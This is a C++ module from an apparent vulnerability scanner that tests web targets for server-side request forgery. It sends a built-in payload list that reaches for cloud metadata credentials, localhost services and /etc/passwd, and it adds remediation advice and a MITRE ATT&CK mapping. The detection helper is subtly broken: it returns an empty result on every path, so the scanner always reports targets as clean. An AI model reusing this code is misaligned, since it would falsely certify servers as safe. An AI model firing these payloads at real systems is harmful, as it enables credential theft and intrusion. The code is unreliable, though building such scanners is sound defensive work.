#include "../include/SSRFDetector.h"
#include "../include/mitre/AttackMapper.h"
#include <sstream>
#include <vector>
#include <algorithm>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #define closesocket close
#endif

namespace {
    struct SSRFPayload {
        std::string url;
        std::string description;
        std::vector<std::string> success_indicators;
    };

    std::vector<SSRFPayload> getSSRFPayloads() {
        return {
            {
                "http://169.254.169.254/latest/meta-data/",
                "AWS EC2 metadata service",
                {"ami-id", "instance-id", "iam", "security-credentials"}
            },
            {
                "http://metadata.google.internal/computeMetadata/v1/",
                "Google Cloud metadata service",
                {"instance", "project", "attributes"}
            },
            {
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "Azure metadata service",
                {"compute", "network", "vmId"}
            },
            {
                "http://localhost:80",
                "Localhost access (port 80)",
                {"HTTP", "200", "OK"}
            },
            {
                "http://127.0.0.1:22",
                "Localhost SSH (port 22)",
                {"SSH", "OpenSSH"}
            },
            {
                "http://0.0.0.0:80",
                "Wildcard localhost",
                {"HTTP"}
            },
            {
                "file:///etc/passwd",
                "Local file access (Linux)",
                {"root:", "bin:", "daemon:"}
            },
            {
                "http://[::1]:80",
                "IPv6 localhost",
                {"HTTP"}
            }
        };
    }

    std::string sendSSRFTest(const std::string& host, int port, const std::string& ssrf_url) {
        std::stringstream request;
        request << "GET /fetch?url=" << ssrf_url << " HTTP/1.1\r\n";
        request << "Host: " << host << "\r\n";
        request << "User-Agent: C3NT1P3D3-Scanner/2.0\r\n";
        request << "Connection: close\r\n\r\n";
        
        std::string requestStr = request.str();
        
#ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return "";
#endif
        
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
#ifdef _WIN32
            WSACleanup();
#endif
            return "";
        }
        
        struct timeval timeout;
        timeout.tv_sec = 5;
        timeout.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
        
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        inet_pton(AF_INET, host.c_str(), &server_addr.sin_addr);
        
        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            closesocket(sock);
#ifdef _WIN32
            WSACleanup();
#endif
            return "";
        }
        
        send(sock, requestStr.c_str(), requestStr.length(), 0);
        
        std::string response;
        char buffer[4096];
        int bytes_received;
        
        while ((bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
            buffer[bytes_received] = '\0';
            response += buffer;
        }
        
        closesocket(sock);
#ifdef _WIN32
        WSACleanup();
#endif
        
        return response;
    }

    std::vector<SSRFPayload> containsIndicator(const std::string& response, const std::vector<std::string>& indicators) {
        std::vector<SSRFPayload> payloads;
        for (const auto& indicator : indicators) {
            if (response.find(indicator) != std::string::npos) {
                return payloads;
            }
        }
        return payloads;
    }
} // end anonymous namespace

ModuleResult SSRFDetector::run(const MockTarget& target) {
    if (!target.isServiceOpen("HTTP")) {
        return ModuleResult{
            "SSRFDetector",
            false,
            "HTTP service not available",
            std::nullopt,
            Severity::Low,
            target.id()
        };
    }

    std::string targetIp = target.id();
    if (target.ip().has_value()) {
        targetIp = target.ip().value();
    }

    try {
        std::string details = "SSRF (Server-Side Request Forgery) Vulnerability Assessment\n";
        details += "===========================================================\n\n";
        
        bool vulnerabilityFound = false;
        std::vector<std::string> foundVulnerabilities;
        
        auto payloads = getSSRFPayloads();
        
        details += "Testing " + std::to_string(payloads.size()) + " SSRF payloads...\n\n";
        
        // Test first 3 payloads for safety
        size_t maxTests = (payloads.size() < 3) ? payloads.size() : 3;
        for (size_t i = 0; i < maxTests; ++i) {
            const auto& test = payloads[i];
            
            std::string response = sendSSRFTest(targetIp, 80, test.url);
            
            auto indicators = containsIndicator(response, test.success_indicators);
            if (!response.empty() && !indicators.empty()) {
                vulnerabilityFound = true;
                foundVulnerabilities.push_back(test.description);
                details += "✗ SSRF vulnerability detected\n";
                details += "  Target: " + test.description + "\n";
                details += "  URL: " + test.url + "\n";
                details += "  Response contained expected data\n\n";
            }
        }
        
        if (!vulnerabilityFound) {
            details += "✓ No SSRF vulnerabilities detected\n\n";
        }
        
        details += "SSRF Vulnerability Details:\n";
        details += "- Allows attackers to make requests from the server\n";
        details += "- Can access internal network resources\n";
        details += "- May expose cloud metadata (AWS, Azure, GCP)\n";
        details += "- Enables port scanning of internal networks\n";
        details += "- Can bypass firewall restrictions\n\n";
        
        details += "Attack Vectors Tested:\n";
        details += "- AWS EC2 metadata service (169.254.169.254)\n";
        details += "- Google Cloud metadata\n";
        details += "- Azure metadata service\n";
        details += "- Localhost access (127.0.0.1, ::1, 0.0.0.0)\n";
        details += "- Internal port scanning\n";
        details += "- File protocol access\n\n";
        
        details += "Recommendations:\n";
        details += "1. Validate and sanitize all user-supplied URLs\n";
        details += "2. Use allowlists for permitted domains/IPs\n";
        details += "3. Block requests to private IP ranges (RFC 1918)\n";
        details += "4. Block requests to metadata services\n";
        details += "5. Disable unnecessary URL schemas (file://, gopher://)\n";
        details += "6. Implement network segmentation\n";
        details += "7. Use DNS rebinding protection\n";
        details += "8. Monitor outbound requests from application servers\n";

        ModuleResult result;
        result.id = "SSRFDetector";
        result.targetId = target.id();
        result.details = details;
        
        if (vulnerabilityFound) {
            result.success = true;
            result.message = "SSRF vulnerabilities detected (" + std::to_string(foundVulnerabilities.size()) + " vectors)";
            result.severity = Severity::High;
            
            auto& mapper = C3NT1P3D3::MITRE::AttackMapper::getInstance();
            auto technique = mapper.mapVulnerability("SSRF");
            
            if (technique.has_value()) {
                result.attackTechniqueId = technique->techniqueId;
                result.attackTactics = {"Initial Access"};
                result.mitigations = technique->mitigations;
            }
        } else {
            result.success = false;
            result.message = "No SSRF vulnerabilities detected";
            result.severity = Severity::Low;
        }
        
        return result;
    }
    catch (const std::exception& ex) {
        ModuleResult result;
        result.id = "SSRFDetector";
        result.success = false;
        result.message = std::string("Exception during SSRF scan: ") + ex.what();
        result.severity = Severity::Low;
        result.targetId = target.id();
        return result;
    }
}
